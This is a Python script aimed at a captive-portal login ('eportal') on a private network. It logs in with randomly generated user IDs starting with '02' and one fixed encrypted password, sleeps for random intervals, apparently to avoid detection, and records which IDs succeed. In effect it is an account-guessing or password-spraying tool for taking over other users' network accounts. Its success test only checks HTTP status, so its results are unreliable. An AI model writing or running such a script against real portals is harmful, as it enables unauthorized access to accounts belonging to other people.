import os
import requests
import time
import random

# 定义URL
url1 = 'http://10.24.127.3/eportal/InterFace.do?method=pageInfo'
url2 = "http://10.24.127.3/eportal/InterFace.do?method=login"
url3 = 'http://10.24.127.3/eportal/InterFace.do?method=getServices'
url4 = 'http://10.24.127.3/eportal/InterFace.do?method=getOnlineUserInfo'
url5 = 'http://10.24.127.3/eportal/index.jsp?'
url6 = 'http://10.24.127.3/eportal/InterFace.do?method=logout'

# 定义数据集
data1 = {
  'userId' : '',
  'userIndex' : '',
#  'userIndex' : '63366162613739636134336664363233323737616364353134643264313732365f31302e32332e3133352e32355f3033333634',
  'password' : '72483ea510176f135a8c68d64be0f7ce245ed04bd36b412bebaf8422cf68f983af4b453348c69f73c09768b94d100be6a5d607fc85c649506095949314c31de40353672dd2902d33608b6015ffdf2c1415ad116dad231c8aba1128584b6d57679ea41e3d7bc299f980241080b22b432ea7612b94d987ac60ad737cc3cfb41e08',
  'passwordEncrypt' : 'true',
  'vaildcode' : '',
  'service' : '',
  'queryString' : 'wlanuserip=873ce49576559538d7e5051b66152210&wlanacname=fd38d7521de3b050841711ac27012e2e&ssid=&nasip=c6aba79ca43fd623277acd514d2d1726&snmpagentip=&mac=717742c64d10fd03be9d0823cc6f4da1&t=wireless-v2&url=795c649bdeb10f4d4d6c1ee3155a5a2a35a0a569f8ecf3bb&apmac=&nasid=fd38d7521de3b050841711ac27012e2e&vid=1fc7ea4712f9d8b1&port=3495334aedfa5fea&nasportid=040f54214d5f54d2f8bb6249163eb184090e32c0ddee0d3569a06211ac6e40ed5f1e3370e974446f8a655b70dca55deb',
  'operatorPwd' : '',
  'operatorUserId' : '',
  'callback' : ''
}

user_agent = 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36 Edg/128.0.0.0'

headers = {
        'User-Agent': user_agent
        }

#params1 = {
#  'wlanuserip' : '873ce49576559538d7e5051b66152210',
#  'wlanacname' : 'fd38d7521de3b050841711ac27012e2e',
#  'ssid' : '',
#  'nasip' : 'c6aba79ca43fd623277acd514d2d1726',
#  'snmpagentip' : '',
#  'mac' : '717742c64d10fd03be9d0823cc6f4da1',
#  't' : '',
#  'url' : '795c649bdeb10f4d4d6c1ee3155a5a2a35a0a569f8ecf3bb',
#  'apmac' : '',
#  'nasid' : 'fd38d7521de3b050841711ac27012e2e',
#  'vid' : '1fc7ea4712f9d8b1',
#  'port' : '3495334aedfa5fea',
#  'nasportid' : '040f54214d5f54d2f8bb6249163eb184090e32c0ddee0d3569a06211ac6e40ed5f1e3370e974446f8a655b70dca55deb'
#}

params2 = {
  'userIndex' : '',
  'callback' : '',
  'userName' : ''
}
#
# 定义变量
#a = requests.post(url2,data=data1,headers)
#a.encoding = 'UTF-8'

# 生成02开头的5位随机数字作为userId
userId = '02' + str(random.randint(0, 999)).zfill(3)
data1['userId'] = userId

# 定义变量
a = requests.post(url2,data=data1,headers=headers)
a.encoding = 'UTF-8'

# 发送登录请求
#response = requests.post(url2, data=data1, headers=headers)

# 获取Jsession
if a.status_code == 200:
    # 获取响应中的 cookies
    cookies = a.cookies
    # 检查 JSESSIONID 是否存在
    if 'JSESSIONID' in cookies :
     jsessionid = cookies['JSESSIONID']
     print(f"JSESSIONID: {jsessionid}")
    else:
     print("JSESSIONID not found in the response cookies.")
else:
    print(f"Failed to retrieve the page. Status code: {a.status_code}")

# 打印结果
#print(a.json())
#print(a.status_code)
print(a.text)
#print(a.apparent_encoding)
#print(a)
#print(a.url)

#保持连接
random_seconds = random.randint(15, 30)
time.sleep(random_seconds)
print(f"已经等待了 {random_seconds} 秒。继续执行下一步...")

# 获取userIndex
a = requests.post(url4,params=params2)
a.encoding = 'GDK'
print(a.text)
#print(a)
#print(a.content)

# 检查请求是否成功
if a.status_code == 200:
    # 登录成功，写入success.txt
    with open('success.txt', 'a', encoding='utf-8') as file:
        file.write(userId + '\n')
else:
    # 登录失败，写入failed.txt
    with open('failed.txt', 'a', encoding='utf-8') as file:
        file.write(userId + '\n')


#保持连接
random_seconds = random.randint(7, 30)
time.sleep(random_seconds)
print(f"已经等待了 {random_seconds} 秒。继续执行下一步...")
#退出登录
a = requests.post(url6,params=params2)
a.encoding = 'GDK'
print(a.text)
